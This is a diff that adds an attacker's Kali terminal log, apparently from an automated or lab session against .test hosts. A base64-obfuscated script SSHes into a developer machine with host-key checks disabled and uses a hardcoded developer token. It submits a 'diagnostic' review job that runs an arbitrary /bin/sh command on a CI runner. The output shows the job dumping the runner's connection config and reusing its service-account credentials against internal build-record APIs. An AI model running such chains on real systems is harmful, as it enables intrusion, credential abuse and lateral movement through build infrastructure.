@@ -1,0 +1,43 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r41.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYgJ2Jhc2ggLXMnIDw8J1JFTU9URScKc2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkNSRUQ9J3Jvd2FuLml0bzpma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8nCmNhdCA+IC90bXAvazA5NGNtZC5zaCA8PCdFT1MnCnNldCArZQpEPSIke0ZJRUxETElOS19SVU5fRElSOi0vcnVuL2ZpZWxkbGluay1jaX0iCmVjaG8gIj09PSBSVU5fRElSPSREID09PSIKbHMgLWxhICIkRCIgMj4mMQplY2hvICI9PT0gY29ubmVjdGlvbnMuZW52ID09PSIKY2F0ICIkRC9jb25uZWN0aW9ucy5lbnYiIDI+JjEKZWNobyAiPT09IGNvbm5lY3Rpb24gY2hlY2sgPT09IgouICIkRC9jb25uZWN0aW9ucy5lbnYiCmVjaG8gIkJVSUxEX1JFQ09SRFNfVVJMPSRGSUVMRExJTktfQlVJTERfUkVDT1JEU19VUkwiCmN1cmwgLXEgLS1zaWxlbnQgLS1zaG93LWVycm9yIC0tZmFpbCAtLWNvbmZpZyAiJEQvYnVpbGQtcmVjb3Jkcy5jdXJsIiAtLXVybCAiJEZJRUxETElOS19CVUlMRF9SRUNPUkRTX1VSTC9hcGkvYnVpbGQtcmVjb3Jkcy93b3JrZXItc3RhdHVzIiAyPiYxOyBlY2hvCmVjaG8gIj09PSBidWlsZC1yZWNvcmRzIGluZGV4ID09PSIKY3VybCAtcSAtLXNpbGVudCAtLXNob3ctZXJyb3IgLS1mYWlsIC0tY29uZmlnICIkRC9idWlsZC1yZWNvcmRzLmN1cmwiIC0tdXJsICIkRklFTERMSU5LX0JVSUxEX1JFQ09SRFNfVVJML2FwaS9idWlsZC1yZWNvcmRzIiAyPiYxOyBlY2hvCmVjaG8gIj09PSB3b3JrZXItc3RhdHVzIHdpdGggaGVhZGVycyA9PT0iCmN1cmwgLXEgLS1zaWxlbnQgLS1zaG93LWVycm9yIC0tY29uZmlnICIkRC9idWlsZC1yZWNvcmRzLmN1cmwiIC1pIC0tdXJsICIkRklFTERMSU5LX0JVSUxEX1JFQ09SRFNfVVJML2FwaS9idWlsZC1yZWNvcmRzL3dvcmtlci1zdGF0dXMiIDI+JjEgfCBoZWFkIC02MApFT1MKcHl0aG9uMyAtIDw8J1BZJwppbXBvcnQganNvbgpjbWQ9b3BlbignL3RtcC9rMDk0Y21kLnNoJykucmVhZCgpCmJvZHk9eyJzdXBwb3J0X2lucHV0IjoiYnVpbGRvcHM6Ly9yZXZpZXdzL2RpYWdub3N0aWMtcmVxdWVzdC1yZWZlcmVuY2VAMyIsImRpYWdub3N0aWMiOnsicHJvZmlsZSI6InJ1bm5lci1jb21tYW5kIiwiYXJndiI6WyIvYmluL3NoIiwiLWMiLGNtZF19fQpvcGVuKCcvdG1wL2swOTRib2R5Lmpzb24nLCd3Jykud3JpdGUoanNvbi5kdW1wcyhib2R5KSkKUFkKUj0kKGN1cmwgLXNTIC1tIDMwIC1nayAtLWNhY2VydCAiJENBIiAtdSAiJENSRUQiIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kIEAvdG1wL2swOTRib2R5Lmpzb24gImh0dHBzOi8vcmV2aWV3LmtlcGxlcm9wcy50ZXN0L2FwaS9yZXZpZXctam9icyIpCmVjaG8gIlBPU1Q6ICRSIgpKPSQoZWNobyAiJFIiIHwgc2VkIC1uICdzLy4qInJ1bl9pZCI6IlwoW14iXSpcKSIuKi9cMS9wJykKaWYgWyAtbiAiJEoiIF07IHRoZW4KICBmb3IgaSBpbiAxIDIgMyA0IDUgNiA3IDggOSAxMDsgZG8KICAgIGN1cmwgLXNTIC1tIDMwIC1nayAtLWNhY2VydCAiJENBIiAtdSAiJENSRUQiICJodHRwczovL3Jldmlldy5rZXBsZXJvcHMudGVzdC9hcGkvcmV2aWV3LWpvYnMvJEoiID4gL3RtcC9rMDk0cmVzLmpzb24KICAgIGdyZXAgLXEgJyJzdGF0ZSI6InN1Y2Nlc3MiXHwic3RhdGUiOiJmYWlsZWQiXHwic3RhdGUiOiJlcnJvciInIC90bXAvazA5NHJlcy5qc29uICYmIGJyZWFrCiAgICBzbGVlcCAyCiAgZG9uZQogIGVjaG8gIj09PSBSRVNVTFQgPT09IgogIHB5dGhvbjMgLSA8PCdQWScKaW1wb3J0IGpzb24KZD1qc29uLmxvYWQob3BlbignL3RtcC9rMDk0cmVzLmpzb24nKSkKcHJpbnQoInN0YXRlIixkLmdldCgic3RhdGUiKSwiZXhpdCIsZC5nZXQoImV4aXRfY29kZSIpLCJydW4iLGQuZ2V0KCJydW5faWQiKSkKcHJpbnQoIlNURE9VVDpcbiIrZC5nZXQoInN0ZG91dCIsIiIpKQpwcmludCgiU1RERVJSOlxuIitkLmdldCgic3RkZXJyIiwiIikpClBZCmZpClJFTU9URQo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r41.sh; bash /tmp/r41.sh; echo DONEMARK_1795208049451$((6*7))
+POST: {"result":"/api/review-jobs/RJ-B33729EA","run_id":"RJ-B33729EA"}
+=== RESULT ===
+state success exit 0 run RJ-B33729EA
+STDOUT:
+=== RUN_DIR=/tmp/fk-run-RJ-B33729EA-s3wa96d4/fieldlink-ci ===
+total 8
+drwxr-x--- 2 fieldkest-ci fieldkest-runner  80 Nov 20 20:54 .
+drwxrwx--- 3 fieldkest-ci fieldkest-runner  60 Nov 20 20:54 ..
+-rw-r----- 1 fieldkest-ci fieldkest-runner 449 Nov 20 20:54 build-records.curl
+-rw-r----- 1 fieldkest-ci fieldkest-runner 164 Nov 20 20:54 connections.env
+=== connections.env ===
+FIELDLINK_BUILD_RECORDS_URL=https://review.keplerops.test
+FIELDLINK_SOURCE_URL=https://source.keplerops.test
+FIELDLINK_PACKAGES_URL=https://packages.keplerops.test
+=== connection check ===
+BUILD_RECORDS_URL=https://review.keplerops.test
+{"availability":"available","principal":"svc-fieldlink-ci","request_id":"606076ea-a653-4953-848d-2b78a6cffa3e","run_id":"RJ-B33729EA"}
+
+=== build-records index ===
+{"routes":[{"method":"GET","path":"/api/build-records/worker-status"}]}
+
+=== worker-status with headers ===
+HTTP/1.1 200 OK
+Server: FieldKest/1.0 Python/3.12.11
+Date: Fri, 20 Nov 2026 20:54:19 GMT
+Content-Type: application/json
+Content-Length: 135
+X-Content-Type-Options: nosniff
+X-Request-ID: 18737175-3833-4975-947e-d2710236cc57
+
+{"availability":"available","principal":"svc-fieldlink-ci","request_id":"18737175-3833-4975-947e-d2710236cc57","run_id":"RJ-B33729EA"}
+
+STDERR:
+
